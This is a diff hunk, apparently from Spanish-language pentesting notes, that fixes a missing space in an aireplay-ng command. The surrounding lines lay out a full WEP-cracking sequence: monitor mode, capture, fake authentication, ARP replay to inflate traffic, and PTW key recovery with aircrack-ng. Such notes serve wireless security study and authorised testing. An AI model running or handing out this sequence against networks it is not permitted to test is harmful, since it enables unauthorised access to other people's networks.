@@ -83,7 +83,7 @@ airmon-ng start wlan0 [channel]
 airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA wlan0mon
 (Recomendable hacer un fake auth para tener la MAC asociada y que sea más fiable) ->
   aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC wlan0mon
-aireplay-ng -2 -b MAC-AP -d FF:FF:FF:FF:FF:FF -t 1 (filtrar que sean paquetes con ToDS) [/ -f 1-m 68 -n 86 (min y max ARP packet size)] wlan0mon
+aireplay-ng -2 -b MAC-AP -d FF:FF:FF:FF:FF:FF -t 1 (filtrar que sean paquetes con ToDS) [/ -f 1 -m 68 -n 86 (min y max ARP packet size)] wlan0mon
   Cuando encuentra un paquete y le damos a "y" para reenviar, los #Data deberían subir mucho. Si no suben, Ctrl+C y probar con otro. Se puede hacer ping desde otro cliente en la red para forzar un ARP
 aircrack-ng -0 -z (usa PTW Attack) -n 64 (num bits de WEP key) CAPTURE-FILENAME
 
